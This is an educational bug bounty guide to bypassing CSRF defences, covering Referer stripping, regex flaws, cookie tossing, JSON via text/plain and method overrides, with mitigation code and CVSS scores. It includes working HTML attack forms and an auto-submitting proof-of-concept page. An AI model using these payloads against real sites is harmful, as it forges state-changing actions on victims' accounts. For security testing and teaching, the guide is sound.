# 📁 Advanced CSRF Testing Methods — Origin, Referer & Token Bypasses

*Contributed by Cyber_Spy.404 | Educational Bug Bounty Series*

> **Scope and ethics:** Advanced CSRF testing evaluates subtle protocol nuances, header parsing edge cases, and cross-origin boundaries. Conduct testing strictly within authorized program rules using dedicated test accounts. Never craft real exploits against production users.

---

## 📌 Executive Summary

While standard CSRF checks evaluate simple form submissions, modern single-page applications (SPAs) and REST APIs implement defense mechanisms such as **Origin/Referer header validation**, **Double Submit Cookie patterns**, and **JSON-only APIs**.

However, subtle implementation flaws in regex matching, header stripping, cross-subdomain cookie scope, and HTTP method overrides often allow attackers to bypass these advanced controls.

---

## 🔍 Advanced Attack Vectors & Testing Methods

```
+---------------------------------------------------------------------------------+
|                        Advanced CSRF Bypass Vectors                             |
+---------------------------------------------------------------------------------+
        |                                |                                 |
        v                                v                                 v
  Origin/Referer Bypasses       Double Submit Cookie Flaws          JSON / Header Spoofing
  - Null Referer                - Subdomain Cookie Tossing          - enctype="text/plain"
  - Regex Flaws (.example.com)  - CRLF Cookie Injection             - _method=PUT overrides
```

---

## 1. Origin and Referer Header Validation Bypasses

Applications that rely on the HTTP `Referer` or `Origin` header to verify the source of a request frequently use flawed validation logic.

### Vector A: Referer Stripping (Testing for Missing Header Acceptance)
Some servers check that the `Referer` matches the target domain *if* the header is present, but allow the request to proceed *if* the header is omitted entirely.
- In your exploit HTML, suppress the Referer header using:
  ```html
  <meta name="referrer" content="no-referrer">
  ```
- If the server accepts the request when `Referer` is absent, the protection is completely bypassed.

### Vector B: Flawed Regex Matching on Referer
Common developer regex mistakes:
1. **Unanchored Domain Check:** If the server checks `if (referer.contains("example.com"))`:
   - Host your exploit at: `https://attacker-example.com/exploit.html`
   - Or: `https://attacker.com/example.com/exploit.html`
2. **Subdomain Inclusion Flaw:** If the server allows any subdomain `*.example.com`:
   - If you can find an XSS or HTML injection on any sub-asset (`blog.example.com`), host the CSRF exploit there to pass the origin check.
3. **Query Parameter Smuggling:**
   - Host exploit at: `https://attacker.com/exploit.html?target=example.com`

---

## 2. Double Submit Cookie Pattern Bypasses

In the Double Submit Cookie pattern, the server sets a random cookie (e.g., `csrf_token=ABC123`) and requires the client to send the same value in a request parameter or header. The server compares the two without storing state in a session.

### Vulnerability Vector: Subdomain Cookie Tossing
If an attacker controls a related subdomain (`user-content.example.com`) or finds a CRLF injection, they can overwrite the victim's CSRF cookie:
1. Attacker plants a known cookie value on `.example.com`:
   ```http
   Set-Cookie: csrf_token=ATTACKER_KNOWN_TOKEN; Domain=.example.com; Path=/
   ```
2. Attacker crafts a CSRF payload containing the matching known token in the body parameter.
3. The server compares the cookie (which the attacker set) with the body parameter (which the attacker sent). They match! The request succeeds.

---

## 3. JSON CSRF via `text/plain` Trick

APIs often assume they are immune to CSRF because they expect JSON. However, if the API does not strictly validate the `Content-Type: application/json` header and blindly parses the request body:

### Exploit Technique:
Construct an HTML form with `enctype="text/plain"`:
```html
<form action="https://example.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"test@example.com","ignore":"' value='test"}' type='hidden'>
</form>
```
When submitted, the browser sends the following HTTP request body:
```text
{"email":"test@example.com","ignore":"=test"}
```
If the backend JSON parser ignores trailing data or handles the malformed boundary, the JSON payload executes cross-origin without triggering a preflight `OPTIONS` request.

---

## 4. Method Overrides (`_method=DELETE` / `_method=PUT`)

Many web frameworks (Laravel, Rails, Express with `method-override`) support overriding the HTTP method via query parameters or hidden form fields because standard HTML forms only support `GET` and `POST`.

If an API protects `DELETE /api/users/90` with CSRF checks, but allows:
```html
<form action="https://example.com/api/users/90?_method=DELETE" method="POST">
  <!-- Hidden form auto-submitting DELETE action -->
</form>
```
An attacker can perform state-changing `PUT` or `DELETE` operations via a standard CSRF form submission.

---

## 🛠️ Safe Educational Verification Template

### Safe HTML Proof-of-Concept with No-Referrer Policy
```html
<!DOCTYPE html>
<html>
<head>
  <!-- Suppress Referer header to test missing-referer handling -->
  <meta name="referrer" content="no-referrer">
  <title>Safe Advanced CSRF PoC</title>
</head>
<body>
  <h1>Safe Testing PoC — Origin & Referer Bypass</h1>
  <form id="pocForm" action="https://example.com/api/v1/profile" method="POST">
    <input type="hidden" name="status" value="controlled_verification_test">
  </form>
  <script>
    document.getElementById('pocForm').submit();
  </script>
</body>
</html>
```

---

## 🛡️ Mitigation & Remediation Guidelines

### 1. Robust Origin and Referer Validation
Strictly parse and validate the origin using URL parsing libraries, never loose regex:
```python
# Python / Flask (SECURE)
from urllib.parse import urlparse

def is_safe_origin(request):
    origin = request.headers.get('Origin') or request.headers.get('Referer')
    if not origin:
        return False  # Strict: reject requests with missing origin on state changes
    
    parsed = urlparse(origin)
    # Check exact host match
    return parsed.netloc == 'example.com' or parsed.netloc == 'www.example.com'
```

### 2. Cryptographically Bound Double Submit (Signed Tokens)
If using the Double Submit Cookie pattern, do not compare raw strings. The cookie must be a cryptographically signed HMAC token bound to the user's session identifier.

### 3. Strict Content-Type Enforcement
Reject any incoming request to JSON API endpoints that does not strictly match `Content-Type: application/json`. Reject `text/plain` and `application/x-www-form-urlencoded` immediately with `415 Unsupported Media Type`.

---

## 📊 CVSS 3.1 Severity Reference

- **Advanced CSRF on Account Settings via Referer Bypass:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` (Score: **8.1 - High**)
- **JSON CSRF via Content-Type Confusion:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` (Score: **6.5 - Medium**)

---

## ✅ Bug Bounty Triage Checklist

- [ ] Tested state-changing endpoints with stripped `Referer` (`no-referrer`).
- [ ] Tested domain suffix and unanchored regex bypasses (`attacker-example.com`).
- [ ] Confirmed whether JSON endpoints process `text/plain` without preflight.
- [ ] Checked for HTTP method overrides (`_method=PUT`, `_method=DELETE`).
- [ ] Confirmed that state changes took effect in a controlled test victim account.
